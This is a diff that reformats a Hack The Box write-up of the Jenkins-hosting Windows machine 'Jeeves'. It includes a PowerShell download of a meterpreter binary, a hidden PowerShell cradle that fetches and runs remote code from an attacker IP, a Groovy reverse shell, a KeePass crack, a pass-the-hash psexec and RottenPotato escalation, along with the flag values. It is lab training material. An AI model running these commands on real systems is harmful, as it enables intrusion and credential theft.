@@ -6,7 +6,7 @@ tags: HTB, groovy, rottenpotato, john2keepass
 ---
 
 # Recon
-1. Nmap
+- Nmap
 ```ruby
 PORT      STATE SERVICE      VERSION
 80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
@@ -19,47 +19,46 @@ PORT      STATE SERVICE      VERSION
 50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
 |_http-server-header: Jetty(9.4.z-SNAPSHOT)
 ```
-2. We use Dirbuster to find out the directories running on port 50000
+- We use Dirbuster to find out the directories running on port 50000
 ![](https://lh3.googleusercontent.com/_afaZLU2r7PSsRJNlxpfM8UkyjsVbg6g8-1q85Q31pA-5CB_W0-cBRwACFTsE3cod1P26WJo78fFhm3EfoTMnTRoUzNeu223cJ20e1OGONEm8cr4S32otLqEsOEmdKU-va4vkY8eYdc1yCsL0H5tTxNEs5G595qg540jwIVNptwK2XqpEf3jtUgdMY7dt-wPnFLbydXqY05RKIRAvS5uCc9gzmYazY2XIDJY4ytIXmW-z0rGHLZeYilfeoZGdkaY5ei7P8ja2Pv2SL4aPq2lINQL5zS7_H18WLcY-pGSGe9yooMTpZlH5W45fsqn5eA4daF0OZ8bGnSBJJeJTyJT05KXz-CGwsJtEWxmbyTJzrN0IhkEE5nZl0XJ1gPTzuv4kNDFP1OvDefKYTLL3fKxJZZoVKtW7SJAdye7Ul6NimfGXyGvGnrdJIi--lQpKuS9wilTDRAHw6R7pWc13AjelcsL0LtUc-1s8tDxV02KJm-KdHXEDXUviW5n915DxNK8gfRnCdnR5i9qtiz0rqaB0F6kJ114EhwwC4qMKfnyu42rMQbGrebQXGLQRqY2-O41EG7Fp5t_NgJFq3Ulin7nbT3NzRfqM8N5SuCwPYhCqQBlsWF824xZzqonarSURAPU0hAoBmsF-UWXB0HfV9m11tdDJU-OycSAgW5daX-ty4aSU2LiT2a7IvA=w584-h209-no)
 
-3. /askjeeves/ has a Jekins app running
+- /askjeeves/ has a Jekins app running
 ![](https://lh3.googleusercontent.com/Jj_T1StwVe2aThqjKb8ybZ3Ythca4n9qyXUwzI0SnGlu_QoIU1wknCBMWre8iu7hq7qx27D6Ypo_rGBWsguoiwYiEnNMpYlMirqT_HUIzl6QQcoS0bbg7oLsAfc57D8iOVkh9sUiOzVxJ2TkPTa_TIUhwSpNhZE5OHkEJwKiZJs5VCuV9hflHd5vXp4mM8iDlhdEMYotLpDtuQRxxjwXotZyfQtWy59PAcGn1mzTPyTbBNwxkIBlYf_HxMXugwl8P25YDWc8Gqei_npEvzSFTIEwGrbdy-XeW-jk0HZoJ2TwherUMO01qV7ITn-v4_uX5GbLhgKP3iMqy2VqtjYGNVRn28nseTHok0AN9sRcoSIyTaPqUn_-5ErL2h3_JIipQSetVYsosRv55wCUVji94bKP8HDPnKuhGKwt_87D9E2SRo9OL4sHs9EaHsBzfxVmZSEDK1pZJ6NEhZsOmzWeuOjjOpXOojvpP32C09eKfymOJHtKTCZ_PR2Edr9xSVuewwRZ605eCjPYjbkTU5FN3zjoKinaUTkCreIqnc_AIVmNp2fwDtYtS_AdWCg3gJJ5iaWjB4sxo4iKw1D9Pm2gzYno3pJ8exVsC8aDZKB7uZU9UWH4YMivbUSS2HjmJz_cLeWBUDEirs-8FiumgfXEwQuabGMbi5cjEHkDilL8PXhLXPtjEGoWqEA=w632-h364-no)
 
-4. To get admin without authenticating:
+- To get admin without authenticating:
 ```ruby
 http://10.10.10.63:50000/askjeeves/securityRealm/user/admin/
 ```
 
 # Exploitation Method 1
 
-1. On Jenkins create a new Item “Execute Windows bash command” and select “Freestyle Project”
-2. Select “Add building Step” and select  “Execute Windows bash command” 
-3. On the bash console type:
+- On Jenkins create a new Item “Execute Windows bash command” and select “Freestyle Project”
+- Select “Add building Step” and select  “Execute Windows bash command” 
+- On the bash console type:
 ```ruby
 powershell wget "http://10.10.14.14/peterpreter.exe" -outfile "meterpreter.exe" 
 ```
 ![](https://lh3.googleusercontent.com/YDkMzr-vtiHmFXOcfFhQ-jH7jwJHqIA4mG4VtCR5_4V5ddTdi5DNFvuYu0_iUxyFGg0mYeDa01p2dWkin60m-wXyvGVl3T2jdiAD9fkGPeCyQRobjP6idpoJ1euKxPaDeQpy-KF7P049lf4x61VASqfhxHpgX_Te_1K7_KPRhIUCwyOzxlwtcKH5y891IF2gyIJk6qNwPyGUgfypQLVWTBzUksJfSUE_dfyOFUWeUVQtK5dSw4YHeNRKlHUu_wZkRf8uRfpuiiCbZnCrYJo08-ZVSDvq7WLYLP7_sfMQvybWlsuXdM8ey_4fyVJutkeu2oYdXRDtBOU22ZROYG5N5kXXvo-8dfKJlhJIC_LMCmEbO7vYjekIXCfJUnHfGwvuf92By4OASnShb63mQpC0ELRs0U0u5WYWkAWBKJdYrxLabjuwjt6dqT_PIjeq9wbrdLlLvN0Zt4ylq_wiyrMLLdrs-EecKC-BDNc24pwU1ZQA1Xkg3JNWCzAYWKV82N8E5QfKroZoWkgWRspDH-x-r3_Y4PFNMBzG7NAhDh2FHsm_aUZgXZubmhmbdAkRfSg5oGgrVTcCdDVhGPYFpglpjAX_7f6_29ZLRUWzdAf29SOyfeDORA_g6Wnu9sY32BjpIeKENlQKpSVjiz9UwepfZDeMxUq_7_HHO_tWEu7MDk3T5Kf8TrIGo9s=w970-h314-no)
 
-4. Start apache and place meterpreter.exe file for download 
-5. Set up multi/handler
-6. Run the shell on jenkins 
+- Start apache and place meterpreter.exe file for download 
+- Set up multi/handler
+- Run the shell on jenkins 
  
-
 # Privilege Escalation Method 1
-1. Download CEH.kdbx keepass file
-2. Use john2keepass to create a hashdump file
+- Download CEH.kdbx keepass file and use john2keepass to create a hashdump file
 ![](https://lh3.googleusercontent.com/9OJrTvzMPP3i6evtNryFb5qTsbZ6hYuMsMxVBMCexwdiFRNtLMd5FDONHlZp29jVycy-DZm5HfJp8sOJMucFUtKf4CyUFQ5eFgS7vfP_IrTF8vFrMomsv2y3RkN3O1LvhsqlwZ9-EoCTWAHNOKHamfJXGx0REoXq4ZAvfawWAfFltjR7pClbmr9thvwl861bHfCizrQfyctVoHuVthL4M9C56d353wTSv_ZT0C3M0CKiQ3PVva9lwEIUQkSXsDLBP_MoVNKnl2j5tfgkJ7RLwu7awrimMRsmUmZZIKhJQYxG1nLgPaSOO8jnGS4cPCP8ythKmrJPbamj_aukj5Js7dX7uplGdBLoIZ7eqvp9ynhUpypwTMUz1qV0blONEDMI0Z9DAv21mupuwy9lgEhldxUGSbkWWCeNCD9wdXgARa68Fj_Z34ymA5deD938PrLFwZNW-dK9atiHSty3PuJZ137cSjJJeCE12eKr9T5-vMPuPCoqtsPbQPBFnRr0rPcKsXVPVkWmRcG1uS4ut7fdcTOeKWcGRpY6qoX-RGaGcjosh0iOmI1gWGplcIZ13ets4HTdUOBTqYbYtf4VwNSzeHakxkzYq-QvogDZoGfQ7pIWez5zNa6eWHy9Qyrkel_So7jCZPTCupseRaP9_fjg2EBzk-7i-fsNSb_-741OtvOmM0MErJ3yijA=w702-h41-no)
 
 ![](https://lh3.googleusercontent.com/V2iiPSYdkJN0xPncus61RGEf31aNjntGxobvD15RWQ3fUoJzXke3K1Tue5ZI1Bj2bTo6v2fcASLwknkVEGR7po5ilL5n2hes31D_H6W8AOCr3dW_R3DbkfV0CccSpGIag-f7nfhVzWw74n_CwbpL4jgGPh7apMcnEqnfrGytrq35ancCHvjt4eVcPTTqqfkxNcfn0uWbUTL3TFGH7BMxf96l8SypVKWsSizSgGu6SzkDy8qwHPeVc8PcvxZaQMYBgfgJR12zwEjzEEeOPKBVbn7QHbtk2ev43cKlOOa8sG9u373O7f4_oKZ06XM7OktzPVmt0gFkxm46MLnvZdtbrqs_iCgW0FIsp5SiITAtU3kkEa4dm2RkB7ZbZuc4apRbVFN9aIYUrxAg9R3T5dAV_fomwvfr0xMAYpTfShNPUCXfu_Q6FAf7q4nyy2saITO2oFe7NTt7RYAkXqc1nuIONF5v-iGDG9l925kQRN_ltKVmeS30Uesla1b2SyiEGFkisnK523pzz6P0BH2nsegS3Ajgj6miEXUZLkViGgFWsU1snZqOe7VDZiZjN2gN8dDD3YWgWmOn420f3ATQULPWRakbezNnOPDpiEC7pagobe2gpcg1fr8_BuH-9Y9NOMZJSMQCecRic3bBYdtF6gJNfJJdBmLXuW3A1jQs7JhxwA30pr6EAVQubFg=w1345-h92-no)
 
-3. crack the has using john format=KeePass and wordlist=rockyou.txt
-4. we obtain the pass : CEH:moonshine1 to load the keepass backup file
-5. Install Keepass2 : apt-get install keepass2
+Crack the has using john format=KeePass and wordlist=rockyou.txt and we obtain the pass : CEH:moonshine1 to load the keepass backup file.
+ 
+Install Keepass2 : apt-get install keepass2
+
 ![](https://lh3.googleusercontent.com/Islqk6gH29nUfCHj6hmq2q71eDb4v8npwOjXZH-YWU4PXsKopusOcWfZpf2bVwFKsoSaoNeWRc82p7xuMjyZI3MmXMqLDb2f2B0wGH19CIQm5V_rsxOajEFUN2On2LOzpFQA3PwwsYW02m5v3eeLUNbYVZYZAm9NJlfqjnJRKC1uHWapMeWIjhhlV2pFT_Aqpq2_E_t6SXiwiBP3IF37eCHgndzIrHCy0fZ6rvRxxr47NRBjkj5UvwhHuyI6oDH_PJvpjOOuyLpuJ4BkG33cdIZZWujGHfweBdZqNVkdID3pLb0wZbAuwcPq_yQ1wluC3QbJ9acLlI_9FZV91d-n6xGZOlAZiatAf6iMxtC4OtjwcRSaEdYYg1fdm_k6o16WkAktDww9rRjmkvYz6tBAtZsca4TG3RHimXsxagR-lQNMMPRMZLAPP83Z6U-TjCEWhlatFs2tMtTSqMxkdlXhmFTx7E1N3kCVOPE2I89I3vNLVnaKtw2KjzTI7R0zP-INNBzP-cVAOOjKip05lrlI8GS_iFkR5b6SV5hekOTC9fqmrb5ZTHq4WsKwoPB48kvBsJVqXuyQi0jjMdha9zMuFV5QxQK4-v4P0xXh3pywPSf61DRGjOZPKkxjm0vEFilKOftQ1jGHKtsSqtffwNwwokLPI87u3UdQRonyC-dpaoSoW_jRvuAqQ5I=w880-h380-no)
 ![](https://lh3.googleusercontent.com/yESheUKzZintmFdhx5grIB2zb4xqmTSHK2WESoOWO4f_BREzErS47xF7urY02sxJ6y6IQRF3hXu6cNg0JjTM1iI6-TWS8cj9wO_qijOF_BcZVsEysvmuv321r1mhSfAXCYCQingIrtmwmTkcbmhl_QSmFIapTtKkO6A7Fx6eTcBOWlJGJ4zA2Jr7SfXMri3Gm5A0GbSx7HnRLmzR9LLwJ-tLp5vIHg_pBLoft8bH0c1NMFqiPlebp-KWeK7JSEDT_i2HCk7nDT2Naw9Zwpl3_PyYIS2BNfvSclSNZNq4_IV4kFBir2e6_MHnlSFH9F-v42hxhXnNXAzFHOYIm2DPmfOZ-_aQ05bStVMjDkT8ZmcyJ5lYyFXeLGthuMTcedri41MKxYrquY8pPzNS25Nv-dXjOFx10wjg3j1kXvO5vz63xxWKyiKozyWOTaCLidmHMNSRO0Rc4iCzbNvKfWNErZc4pr5pNlA1cCCXNtkik8cpfNBeLfmjoSW0l_L6HZ71NBcdp65OphiFlHj8l8SKyX966PNokooYu4ND59OqZGUdIl_jb-7GAHe0Oj-2_ZEi1EYf00fgikl_SYeVO6UaQbsiw_c_yFhB4rgIjUznoUuNxMZ7o2ad4h9FKHZyWGOxunKXVfVNgmv5-wBOk3zUh3Mpy9hHk9E2zzZfouiqjJNbKS-Tj-cLg08=w665-h271-no)
 
-6. We obtain the admin NTLM hash: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
-7. Using msf "windows smb" we connect using a pass the hash techique:   
+We obtain the admin NTLM hash: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+Using msf "windows smb" we connect using a pass the hash techique:   
 ```ruby
 use exploit/windows/smb/psexec
 msf exploit(windows/smb/psexec) > set rhost 10.10.10.63
@@ -71,17 +70,17 @@ msf exploit(windows/smb/psexec) > exploit
 ![](https://lh3.googleusercontent.com/eBGePb4dnYzjoWMM-uXeEVgU0B46DEP9OgC_jyx8zfjsLP751XG5pEewQIpctBbWS5_J8PwDD5jVA-KrKoV7QgQxgWd0W6m-71PKfePq7xgLdVMytDA8OiAL-_koytlRo-5RaMwu8iZc3dIsHmq0hYVxvDMaxzyeH_DjcDl_hAJqQ1sDZLzaVX7tAth7l8yWfvlcvNoOPQ2ydYo5QKMTd4HbsnwacR5PzQZ12NIPXsRRJWwgkpHaZvTYLU2A799DJXPJLQZjBoe1K9WY8bGyn8Ecd3QfBXFVuLVHPdpS74V7s7H_01iEgGVk6d39JKRcoHZxIyKsH5TXzcWFX_CSCMyxRZTl2hUw41VvyXQ3sd-XavvAn4XPNEcioBey3fJyzLk89FED6qEMUnriqdnmQ-DXtDNjO6lfJwG75pDVecQrck1ou6IACPABkJTqvbk6-_uWNcASpUYnNGhKUb0Hk2E95Jwl7BH_lSKNGGI9arxIXDLe-jHREUdpRCLfwLx7yV5bPQfCtY4zPI3ENM_AUGGr_tl5QMXmKNo3dVlBI8Cy-BuuDsx3MOmV5QvBLF9PXfj9EXHA1nle7ahUKbgQTxByBQZ-dcUCdBCPJBaLkzRbELxKX8nQGGXcxjA3--NYeMvx8DJB5dGFGO4-sLeou4CMl1UA6jxc7Zumi272S3fDpfmbbWHcU1M=w800-h135-no)
 ![](https://lh3.googleusercontent.com/jkBEIkugszoadzManrJjWgPSIbhMSZ8GCHx1CgbEUGvemic6IjOqB0oLqNJ_UZi9o6S2uEOpWKLS8HZqiNRkh01l3dPXAslRa4bbVsZcZQpFlz_WKW8_WcnH2iW9pOAhyEmUzWb-AxmsCldGiQIJT4t7reDBZeJomaNh146EKAgSjFTZvE8_oMV16MmhKHvPRhUQyAGzFQwvN2gqvu1SWiwVfZuXy3JembymELFzWpITfviVRZHOFQM6qLTZ2enZWELKBixCIkXoDxXOs5qNXaUJuNUBCRLZMUp52D3xncwImlnXN_oSHV5tTFS4ymRinMLIKiavRhAbbWkBkUVHShKOjcVfxpAihdt0Lb1oTcGy58xqfggYpruewA89FUp9SK8K-cHRG-y-SfM0HsouT5c9zu-CW0v8gx5zCR3r0Wqhq77A9C_PV4xkpgeTQdfTx5rV2CUROlN9TSaYxGedNUtZWSznAWcRbBEFyDzYQyTMrgUuJ1PCYN5IUDwKSywX5HYdwcMvdShwlNn3XHLM7wOLB2r9lSc0YeKiVkm_m8MhLxs0DnoI8vyXYCJBoKfSs-dXlirhkPP65i9XxBh9_PZj1BL1pOA7Qoo2AG9VAyQiZ1NZuU_fGnhq8HDA2jeVLB2GG-AdecuEMF9wM0t-AwQ0PaoySeJ4SsnfAuMqJZFnW3JIBHbv9EI=w1027-h250-no)
 
-8. There is an alternate data stream applied to the ROOT flag. to view flag
-dir /R
-more < hm.txt:root.txt
+There is an alternate data stream applied to the ROOT flag. to view flag
+`dir /R
+more < hm.txt:root.txt`
+
 ![](https://lh3.googleusercontent.com/xpd9SOEyI-JiReW2JbioAi5AHMCFGy0V0tHvKOvKTVGHz_cFIYogPb7A97ebQStpAVXRvvO8wSzkWQ8-RVjdsPBPuXU3WXIu-1F2CCcJB6NJQjm7i1FFZoM6yRXo4OwLSdLemtzVfa6FkZ01TK_YqR8Ek88JQDalshpNtugrdYquLhrOaDaK2knsxfvJCNVmFzvBM36fNmerXk6v1rLlGuZ_XHYU13qbQUlJrBB03UCCp3KSxXY_5njK80QIFHOAvrUlEOsg2GgHXiRY1PJys_OQ9QOkIDmOTbSGPm10tImD1CAoulflJDb7FYywwHTgU6QYHCgvgkmZ7P8Z_4O0YKmdko7PG-QPWMC2Z1hEsK-bcJzzLR77tsxXslJjzzmxDcbYAOAoGqov0cN-GeOln22HWPmRN0DujJennCg6ARTRuiWK1v6CHOAq2gChBiH6xYqcU9Lw_HigXJV0dc70_E9q3Cj8MpEjevgZdq2DXk0T9892WvKy562S_aOQc4OexG7_kiB4M-4NqIGwGS2YK-tkxFeXI5lJHOfPlSAkdbJl27L6tFsfFyxxFIXcYgi2n0Z72pKqVd6Isr3ci3MnDlFFmkdyUnEm3RPD_uH7mMaxpT8ZPLTFBU41wkIuvixCa0Cr6fSvTnMfmnOhxvK4v6H5mgpNn0uS5FuD1b5LwhMz_7vaf1S5z6o=w567-h457-no)
 
 # Exploitation Method 2
-1. On Jenkins, create a reverser Groovy shell on the “script console” under “manage Jenkins” tab and run it
+On Jenkins, create a reverser Groovy shell on the “script console” under “manage Jenkins” tab and run it
 ![](https://lh3.googleusercontent.com/FQ5o3fWatVzanE6muqXIeYxVxlS8jQPi6Bv8_U5FUys52OShe0tsZ4D6rlHXkyLFGibxeeLQRIHHcyoBpviboovTRMaBXEqb6o5THcYwj61z0rj1JnDcdDkV8dbvp7PD-cm7xzZgpMWPIpRXZ0xs6MYARFaQI4jUb2tjIC2KM2qzWnPFOkHES1Lgdq88OEtn-2mdg2uNf3fa_6jal1iQP34tn7m_JjvE4ssIVQWENE-F_bPJ_C-jPvohYjL_5chRkq1Kx_LKAKMyaF6e-msKgVOSaSEySgrhC3c6vtmUFtD5hSy4EjrxadEcsVs0m_QcqJxcBLLdAbGCeu_AgXzHuThcB9yozRZLTHi5NRipm6cmE56XYLGM4n-7wcr04P7IT5EPjbblF8bW5eFBuCx50z6fOkQTNbVyqJT-UAj6flFYpgzepqkJ_iY2Gd98EO6pPCMyh0-TSfGozdMyfSYCRns0eDiEK3em0_IJDtUSTcTtcr9MtcumII-3hTZbIKX0mWotQ8125hiaM-fnJT4iBlFp0obvK7sroscqZn98mpa65Gy_6iOfHml05eIVQZxiM9gAV1Zm7j0itM8Q95oXnOys2HJyAakhnqV-3CX8cz0eIj9ZxMBZ97MTo7IfaWprlmx16hOODWA5PVCzyxXb80MXjzLVhwZ9Lt9n9QOYg81xVttQpxVmPKI=w503-h125-no)
 
-2. Set up an nc listener to recieve the shell
-3. Set up a meterpreter shell:
+Set up an nc listener to recieve the shell and set up a meterpreter shell:
 ```ruby
 use exploit/multi/script/web_delivery
 msf exploit(multi/script/web_delivery) > set target 2
@@ -90,7 +89,7 @@ msf exploit(multi/script/web_delivery) > set lhost 10.10.14.28
 msf exploit(multi/script/web_delivery) > set srvhost 10.10.14.28
 msf exploit(multi/script/web_delivery) > exploit
 ```
-4. We paste the following generated code into the netcat listener and meterpreter session should be created
+We paste the following generated code into the netcat listener and meterpreter session should be created
 ```ruby
 powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.14.34:8080/MHGDnJdwHT');
 powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://10.10.14.34:8080/MHGDnJdwHT');
@@ -103,11 +102,10 @@ powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRe
 
 # Privilege Escalation Method 2
 
-1. Use Windows Exploit Suggesters
-2. We use the Vuln MS16-075 and we upload RottenPotato.exe to the target machine
-3. then we load meterpretert incognito: load incognito
-4. we execute the rottenpotato.exe file
-5. then we type:
+We Use Windows Exploit Suggesters and we choose the Vuln MS16-075; we upload RottenPotato.exe to the target machine
+Then we load meterpretert incognito: load incognito
+We execute the rottenpotato.exe file
+Then we type:
 ```ruby
 impersonate_token "NT AUTHORITY\SYSTEM"
 ```
@@ -115,9 +113,9 @@ and finally we get root level access.
 ![](https://lh3.googleusercontent.com/zBWypHEBhLc6rJr4e0nfdaRSeTA51f4sOLArH4Jz_UlHQR7wxJ90Lsz4ohA_CoQv0AIDnwycooSnaCz9CqBnRHbzA80EkXYQa5cDtEIaCr06jkCFDl9P0Nz8n94mriplK7pPnNix-Pqbl1XHr5V4lnkVIHBch-K7NoazKkcKnxk9lsIwJcVNc_6w9JAy7muxtJHZnk0e29zCjKQnzJKtSb3Fmq-dq1RoeHWBiT4yv7bbehtyvzSUHhDCrEC040zNh5QNeUMNyUikSoylSkyk5b1sOks-qb5JuwdNAQPqhyPfjNcuPB9vs4ARnBOHwZtPZ6ML9fkYCdkhTYx__nEj1hxXPwXX8lSQMU6DyfVzsL3Yig6vlHFtvoYxgyUUlUx7cknjgoLm7ZYTJ6KqhiWmSFhb7cAjZpLC07V9_h90PReJ7KgFP0CQ2cXUOZpjzzrf5-nqDhbZXh9QAFJ7qbjRqeQ6c-E9aMn6dkdV6ONRqMrbw9P3HI6tGonaXaRa6tl4mYfB2aKQHf5t_uQ9oYzIdPGP0vz26cLW4wS2cm-wzGzn1nN5228YVD4Ju3n6q6xCGolE9LMzyPc5H_RACVnResBfUgvp8O-jt9pC3QrSy16t1kb2h0d8aNjbgonKh2J7wKKz4S7I8qx7BnkEyfH859uIb3V_1Ef8GlyEytzBJMf-q7x9ZeZOXxA=w656-h308-no)
 
 # Flags
-```ruby
-| ROOT | afbc5bd4b615a60648cec41c6ac92530 |
-| USER | e3232272596fb47950d59c4cf1e7066a |
+```SHELL
+ ROOT  "afbc5bd4b615a60648cec41c6ac92530" 
+ USER  "e3232272596fb47950d59c4cf1e7066a" 
 ```
 
 
